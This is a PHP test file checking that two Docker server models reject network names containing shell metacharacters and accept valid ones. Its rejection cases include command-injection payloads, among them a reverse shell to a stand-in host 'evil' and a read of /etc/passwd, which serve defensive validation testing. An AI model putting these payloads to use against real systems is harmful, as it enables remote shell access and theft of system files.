<?php

use App\Models\StandaloneDocker;
use App\Models\SwarmDocker;

it('StandaloneDocker rejects network names with shell metacharacters', function (string $network) {
    $model = new StandaloneDocker;
    $model->network = $network;
})->with([
    'semicolon injection' => 'poc; bash -i >& /dev/tcp/evil/4444 0>&1 #',
    'pipe injection' => 'net|cat /etc/passwd',
    'dollar injection' => 'net$(whoami)',
    'backtick injection' => 'net`id`',
    'space injection' => 'net work',
])->throws(InvalidArgumentException::class);

it('StandaloneDocker accepts valid network names', function (string $network) {
    $model = new StandaloneDocker;
    $model->network = $network;

    expect($model->network)->toBe($network);
})->with([
    'simple' => 'mynetwork',
    'with hyphen' => 'my-network',
    'with underscore' => 'my_network',
    'with dot' => 'my.network',
    'alphanumeric' => 'network123',
]);

it('SwarmDocker rejects network names with shell metacharacters', function (string $network) {
    $model = new SwarmDocker;
    $model->network = $network;
})->with([
    'semicolon injection' => 'poc; bash -i >& /dev/tcp/evil/4444 0>&1 #',
    'pipe injection' => 'net|cat /etc/passwd',
    'dollar injection' => 'net$(whoami)',
])->throws(InvalidArgumentException::class);

it('SwarmDocker accepts valid network names', function (string $network) {
    $model = new SwarmDocker;
    $model->network = $network;

    expect($model->network)->toBe($network);
})->with([
    'simple' => 'mynetwork',
    'with hyphen' => 'my-network',
    'with underscore' => 'my_network',
]);
